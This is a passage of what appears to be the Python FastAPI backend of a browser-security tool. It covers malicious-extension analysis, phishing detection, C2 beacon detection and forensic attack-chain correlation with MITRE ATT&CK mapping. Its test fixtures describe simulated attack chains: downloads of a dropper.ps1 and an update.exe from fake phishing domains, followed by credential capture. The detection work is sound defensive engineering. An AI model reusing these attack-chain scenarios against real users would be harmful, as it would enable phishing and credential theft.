    t0 = datetime(2024, 3, 15, 20, 0, 0)
    def ev(ts, atype, detail, risk=False):
        return {"timestamp": ts.isoformat(), "artifact_type": atype, "source_file": "test",
                "detail": detail, "risk_flag": risk, "risk_reasons": [], "anomaly_score": 0,
                "anomaly_reasons": [], "rule_flags": []}
    events = [
        ev(t0, "history", {"url": "https://phish-chain-test.net/update"}, risk=True),
        ev(t0 + timedelta(seconds=40), "download", {"filename": "update.exe", "source_url": "https://phish-chain-test.net/update.exe", "size_bytes": 1024000, "danger_type": 1}, risk=True),
        ev(t0 + timedelta(seconds=90), "credential", {"origin": "https://phish-chain-test.net", "username": "victim", "times_used": 0, "password": "[ENCRYPTED]"}, risk=True),
    ]
    events = apply_single_artifact_rules(events)
    corr = run_correlation(events)
    chains = corr["attack_chains"]
    assert len(chains) > 0, "No attack chain detected"
    return {"detail": f"browse→download.exe→credential on phish-chain-test.net → {len(chains)} chain(s) detected"}

async def _tc_c4_mitre():
    from .c4.rules import apply_single_artifact_rules
    from .c4.correlation import run_correlation
    from .c4.mitre import run_mitre_mapping
    from datetime import datetime, timedelta
    t0 = datetime(2024, 3, 15, 14, 0, 0)
    def ev(ts, atype, detail, risk=False):
        return {"timestamp": ts.isoformat(), "artifact_type": atype, "source_file": "test",
                "detail": detail, "risk_flag": risk, "risk_reasons": [], "anomaly_score": 0,
                "anomaly_reasons": [], "rule_flags": []}
    events = [
        ev(t0, "history", {"url": "https://mitre-test.ru/cmd"}, risk=True),
        ev(t0 + timedelta(minutes=1), "download", {"filename": "dropper.ps1", "source_url": "https://mitre-test.ru/dropper.ps1", "size_bytes": 8192, "danger_type": 1}, risk=True),
        ev(t0 + timedelta(minutes=2), "credential", {"origin": "https://mitre-test.ru", "username": "target", "times_used": 0, "password": "[ENCRYPTED]"}, risk=True),
    ]
    events = apply_single_artifact_rules(events)
    corr = run_correlation(events)
    mitre = run_mitre_mapping(corr, events)
    findings = mitre["all_findings"]
    assert len(findings) > 0, "No MITRE findings"
    high = mitre["by_severity"]["High"]
    return {"detail": f"{len(findings)} MITRE ATT&CK findings — High:{high} Medium:{mitre['by_severity']['Medium']} Low:{mitre['by_severity']['Low']}"}


_ALL_TEST_CASES = [
    {"id":"c1_benign",    "component":"c1","label":"Benign manifest → no risk flags",         "fn":_tc_c1_benign_manifest},
    {"id":"c1_malicious", "component":"c1","label":"Malicious manifest → 4 high-risk flags",  "fn":_tc_c1_malicious_manifest},
    {"id":"c1_code_eval", "component":"c1","label":"Code: eval + atob + fetch + cookie detected","fn":_tc_c1_code_eval_detection},
    {"id":"c1_entropy",   "component":"c1","label":"Shannon entropy: obfuscated > clean",      "fn":_tc_c1_entropy},
    {"id":"c2_url_phish", "component":"c2","label":"URL: paypal-secure-login.yolasite.com flagged","fn":_tc_c2_url_phishing},
    {"id":"c2_url_clean", "component":"c2","label":"URL: google.com scores below threshold",  "fn":_tc_c2_url_benign},
    {"id":"c2_form_off",  "component":"c2","label":"Form: off-domain POST → score > 0.5",     "fn":_tc_c2_form_offsite},
    {"id":"c2_form_same", "component":"c2","label":"Form: same-domain POST → score = 0",      "fn":_tc_c2_form_samedomain},
    {"id":"c2_browser_phish","component":"c2","label":"[Browser] BitB phishing page → detected live","fn":_tc_c2_browser_phish,"browser":True},
    {"id":"c2_browser_clean","component":"c2","label":"[Browser] Clean page → low score",     "fn":_tc_c2_browser_clean,"browser":True},
    {"id":"c3_beacon_iat","component":"c3","label":"Beacon events: IAT-CV < 0.10 (clockwork timing)","fn":_tc_c3_beacon_iat},
    {"id":"c3_human_iat", "component":"c3","label":"Human browsing: IAT-CV > 0.10 (irregular)","fn":_tc_c3_human_iat},
    {"id":"c3_fusion_beacon","component":"c3","label":"Risk fusion: BEACON verdict at high signals","fn":_tc_c3_fusion_beacon},
    {"id":"c3_fusion_safe","component":"c3","label":"Risk fusion: SAFE verdict at zero signals","fn":_tc_c3_fusion_safe},
    {"id":"c4_cooccurrence","component":"c4","label":"Co-occurrence: history+cookie+credential on same domain","fn":_tc_c4_cooccurrence},
    {"id":"c4_attack_chain","component":"c4","label":"Attack chain: browse→download.exe→credential","fn":_tc_c4_attack_chain},
    {"id":"c4_mitre",     "component":"c4","label":"MITRE ATT&CK mapping on attack scenario", "fn":_tc_c4_mitre},
]


@app.get("/dev/run_tests_stream")
async def run_tests_stream_endpoint(component: str = "all"):
    """SSE stream: runs test cases one by one and emits results."""
    cases = [tc for tc in _ALL_TEST_CASES
             if component == "all" or tc["component"] == component]

    async def generate():
        total = len(cases)
        yield f"data: {json.dumps({'type':'init','total':total})}\n\n"
        passed = 0
        failed = 0
        for i, tc in enumerate(cases):
            yield f"data: {json.dumps({'type':'start','index':i,'id':tc['id'],'label':tc['label'],'component':tc['component'],'browser':tc.get('browser',False)})}\n\n"
            start = _time.time()
            try:
                result = await tc["fn"]()
                elapsed = round(_time.time() - start, 2)
                passed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'pass','elapsed':elapsed,'detail':result.get('detail',''),'browser_url':result.get('browser_url','')})}\n\n"
            except AssertionError as e:
                elapsed = round(_time.time() - start, 2)
                failed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'fail','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
            except Exception as e:
                elapsed = round(_time.time() - start, 2)
                failed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'error','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
            # small pause between tests so browser has time to display the page
            await asyncio.sleep(0.3)
        yield f"data: {json.dumps({'type':'done','passed':passed,'failed':failed,'total':total})}\n\n"

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive"},
    )


@app.post("/dev/simulate_click")
async def dev_simulate_click():
    _BASE = os.path.dirname(os.path.abspath(__file__))
    ext_dir = os.path.join(_BASE, "c1", "test_malicious_ext")
    if not os.path.isdir(ext_dir):
        raise HTTPException(status_code=404,
            detail="test_malicious_ext directory not found next to main.py")
    manifest_path = os.path.join(ext_dir, "manifest.json")
    bg_path       = os.path.join(ext_dir, "background.js")
    with open(manifest_path, encoding="utf-8") as f:
        manifest_dict = json.load(f)
    with open(bg_path, encoding="utf-8") as f:
        source_code = f.read()
    fake_ext_id  = "test_malicious_ext_simulate"
    fake_url     = "https://chromewebstore.google.com/detail/websentinel-test/simulate"
    asyncio.create_task(_simulate_click_task(
        json.dumps(manifest_dict), source_code, ext_dir, fake_ext_id, fake_url
    ))
    return {"status": "simulation started — watch the C1 Live tab"}


async def _simulate_click_task(manifest_str, source_code, ext_path, ext_id, webstore_url):
    print(f"[C1-SIM] Simulating 'Add to Chrome' click: {ext_id}")
    await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                      "url": webstore_url, "state": "analyzing"})
    try:
        static_result    = await analyze_extension_c1(manifest_str, source_code, ext_id)
        static_score_pct = static_result["static"]["score"] * 100
        if static_score_pct >= 50.0:
            await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                               "url": webstore_url, "state": "sandbox_running",
                               "static_score": round(static_score_pct, 1)})
            c1_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                    extension_path=ext_path)
        else:
            c1_result = static_result
        _store_c1_result(c1_result, "simulated_click", webstore_url)
        _pending_installs[ext_id] = {"c1_result": c1_result, "ext_path": ext_path,
                                      "webstore_url": webstore_url}
        state = {"SAFE": "safe", "SUSPICIOUS": "suspicious",
                 "MALICIOUS": "malicious"}.get(c1_result["verdict"], "suspicious")
        print(f"[C1-SIM] {ext_id} -> {c1_result['verdict']} (score={c1_result['score']:.3f})")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": state, "result": c1_result})
    except Exception as exc:
        print(f"[C1-SIM] FAILED: {exc}")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": "error", "error": str(exc)})


@app.get("/session/pending_installs")
async def get_pending_installs():
    return {
        ext_id: {"verdict": v["c1_result"]["verdict"], "score": v["c1_result"]["score"],
                 "webstore_url": v["webstore_url"]}
        for ext_id, v in _pending_installs.items()
    }


# ══════════════════════════════════════════════════════════════════════════════
#  C3 — Browser Execution-Aware C2 Beacon Detector
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/c3/status")
async def c3_status():
    return c3_analyzer.status()


@app.get("/c3/alerts")
async def c3_alerts(limit: int = 50):
    return c3_alert_store.list_alerts(limit)


@app.get("/c3/hosts")
async def c3_hosts():
    return c3_analyzer.hosts()


@app.get("/c3/hosts/{host:path}")
async def c3_host_detail(host: str):
    return c3_analyzer.host_detail(host)


@app.get("/c3/requests")
async def c3_requests(limit: int = 50):
    return c3_analyzer.recent_requests(limit)


@app.post("/c3/hosts/{host:path}/unblock")
async def c3_unblock_host(host: str):
    await c3_interceptor.unblock_host(host)
    return c3_analyzer.status()


@app.post("/c3/collect/start")
async def c3_collect_start(req: C3CollectReq):
    return c3_analyzer.start_collection(req.label)


@app.post("/c3/collect/stop")
async def c3_collect_stop():
    return c3_analyzer.stop_collection()


@app.post("/c3/collect/export")
async def c3_collect_export():
    return c3_analyzer.export_collection()


@app.get("/c3/test/beacon-target")
async def c3_test_beacon_target():
    return {"ok": True, "component": "c3", "target": "beacon",
            "timestamp": datetime.now().isoformat()}


@app.post("/c3/test/beacon-target")
async def c3_test_beacon_target_post(body: dict | None = None):
    return {"ok": True, "component": "c3", "target": "beacon",
            "received": body or {}, "timestamp": datetime.now().isoformat()}


@app.get("/c3/test/beacon-page", response_class=HTMLResponse)
async def c3_test_beacon_page(interval: int = 30000, method: str = "GET"):
    interval = max(1000, min(int(interval), 300000))
    method = "POST" if str(method).upper() == "POST" else "GET"
    body    = "JSON.stringify({ ts: Date.now(), component: 'c3' })" if method == "POST" else "undefined"
    headers = "{ 'Content-Type': 'application/json' }" if method == "POST" else "{}"
    return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>C3 Test Beacon</title>
  <style>
    body {{ font-family: system-ui, sans-serif; background:#111827; color:#e5e7eb; padding:24px; }}
    code {{ color:#fbbf24; }}
  </style>
</head>
<body>
  <h1>C3 Test Beacon</h1>
  <p>This page sends a small {method} request every <code>{interval}ms</code>.</p>
  <p>Put this tab in the background to test idle/background beacon detection.</p>
  <pre id="log"></pre>
  <script>
    const log = document.getElementById('log');
    async function tick() {{
      try {{
        const res = await fetch('/c3/test/beacon-target?ts=' + Date.now(), {{
          method: '{method}',
          headers: {headers},
          body: {body},
          cache: 'no-store'
        }});
        log.textContent = new Date().toLocaleTimeString() + ' beacon -> ' + res.status + '\\n' + log.textContent;
      }} catch (err) {{
        log.textContent = new Date().toLocaleTimeString() + ' error -> ' + err + '\\n' + log.textContent;
      }}
    }}
    tick();
    setInterval(tick, {interval});
  </script>
</body>
</html>"""


# ══════════════════════════════════════════════════════════════════════════════
#  C4 — Browser Artifact Forensic Correlation Engine
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/forensic/debug")
async def forensic_debug():
    fallback = get_default_profile_path()
    return {
        "component": "C4",
        "playwright_profile_path": PW_PROFILE_DIR,
        "playwright_profile_exists": os.path.isdir(PW_PROFILE_DIR),
        "playwright_session_running": pw_session.is_running,
        "fallback_profile_path": fallback,
        "hint": (
            "C4 scans the Playwright Chromium profile when the session is running. "
            "If databases are locked, stop the session and retry."
        ),
    }


@app.post("/forensic/extract")
async def forensic_extract(req: ForensicReq):
    profile_path = req.profile_path
    if not profile_path:
        if pw_session.is_running or os.path.isdir(PW_PROFILE_DIR):
            profile_path = PW_PROFILE_DIR
    try:
        result = await asyncio.to_thread(run_forensic_analysis, profile_path, req.save_outputs)
        await _broadcast({"type": "forensic_analysis", "data": get_c4_summary(result)})
        return {"status": "ok", "summary": get_c4_summary(result), "result": result}
    except (FileNotFoundError, ValueError) as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc)) from exc


@app.get("/forensic/report")
async def forensic_report():
    result = get_last_result()
    if not result:
        return {"status": "no_data", "summary": get_c4_summary()}
    return {"status": "ok", "summary": get_c4_summary(result), "result": result}


@app.get("/forensic/summary")
async def forensic_summary():
    return get_c4_summary()


@app.get("/forensic/timeline")
async def forensic_timeline(type: str = "all", flagged: bool = False, limit: int = 300):
    result = get_last_result()
    if not result:
        return {"status": "no_data", "events": []}
    events = result.get("events", [])
    if type != "all":
        events = [e for e in events if e.get("artifact_type") == type]
    if flagged:
        events = [e for e in events if e.get("risk_flag")]
    events = sorted(events, key=lambda e: e.get("timestamp", ""), reverse=True)
    return {"status": "ok", "events": events[:limit]}


@app.get("/forensic/mitre")
async def forensic_mitre():
    result = get_last_result()
    if not result:
        return {"status": "no_data", "findings": []}
    return {"status": "ok",
            "findings": result.get("mitre_result", {}).get("all_findings", [])}


@app.get("/forensic/report/html")
async def forensic_report_html():
    html = render_last_html()
    if not html:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(html, media_type="text/html",
        headers={"Content-Disposition": f"attachment; filename={report_filename('report')}.html"})


@app.get("/forensic/report/json")
async def forensic_report_json():
    data = render_last_json()
    if not data:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(data, media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename={report_filename('report')}.json"})


@app.get("/forensic/report/siem")
async def forensic_report_siem():
    data = render_last_siem()
    if not data:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(data, media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename={report_filename('siem')}.json"})


# ══════════════════════════════════════════════════════════════════════════════
#  Playwright session endpoints (shared by all components)
# ══════════════════════════════════════════════════════════════════════════════

async def _pw_nav_handler(url: str, page=None) -> None:
    """C2 phishing analysis on every navigation. C1 runs on click, not navigation."""
    dom        = await pw_session.get_dom()
    screenshot = await pw_session.get_screenshot_b64()
    title      = await pw_session.get_title()
    req        = AnalyzeReq(url=url, dom=dom, screenshot=screenshot)
    result     = await analyze(req)
    await _broadcast({"type": "analysis",   "data": result})
    await _broadcast({"type": "url_change", "url": url, "title": title})


async def _bg_start_session() -> None:
    global _session_starting
    try:
        await pw_session.start()
        # C3 — attach network interceptor and start analysis loop
        await c3_tagger.setup(pw_session.context)
        await c3_interceptor.start(pw_session)
        await c3_analyzer.start_loop(pw_session, _broadcast)
        home = settings.get("pw_home_url", "").strip()
        if home:
            try:
                await pw_session.navigate(home)
            except Exception:
                pass
        url = await pw_session.current_url()
        await _broadcast({"type": "session_started", "url": url})
    except Exception as exc:
        print(f"[Session] Start failed: {exc}")
        await _broadcast({"type": "session_error", "message": str(exc)})
    finally:
        _session_starting = False


@app.get("/session/status")
async def session_status():
    url = await pw_session.current_url() if pw_session.is_running else ""
    return {"running": pw_session.is_running, "url": url}


@app.post("/session/start")
async def session_start():
    global _session_starting
    if pw_session.is_running:
        return {"status": "already_running"}
    if _session_starting:
        return {"status": "starting"}
    _session_starting = True
    pw_session.clear_callbacks()
    pw_session.add_nav_callback(_pw_nav_handler)
    pw_session.add_click_callback(_on_extension_install_click)
    asyncio.create_task(_bg_start_session())
    return {"status": "starting"}


@app.post("/session/stop")
async def session_stop():
    global _session_starting
    _session_starting = False
    # Tear down C3 before closing the browser
    await c3_analyzer.stop_loop()
    await c3_interceptor.stop()
    await pw_session.stop()
    await _broadcast({"type": "session_stopped"})
    return {"status": "stopped"}


@app.post("/session/navigate")
async def session_navigate(req: NavigateReq):
    url = req.url.strip()
    if not url:
        raise HTTPException(status_code=400, detail="url required")
    if not pw_session.is_running and _session_starting:
        for _ in range(20):
            await asyncio.sleep(0.25)
            if pw_session.is_running:
                break
    if not pw_session.is_running:
        raise HTTPException(status_code=400, detail="Playwright session not running")
    return {"url": await pw_session.navigate(url)}


# ══════════════════════════════════════════════════════════════════════════════
#  WebSocket — real-time event stream
# ══════════════════════════════════════════════════════════════════════════════

@app.websocket("/ws/events")
async def ws_events(websocket: WebSocket):
    await websocket.accept()
    _ws_clients.add(websocket)
    await websocket.send_json({
        "type":            "init",
        "session_running": pw_session.is_running,
        "url":             await pw_session.current_url() if pw_session.is_running else "",
    })
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        _ws_clients.discard(websocket)
    except Exception:
        _ws_clients.discard(websocket)
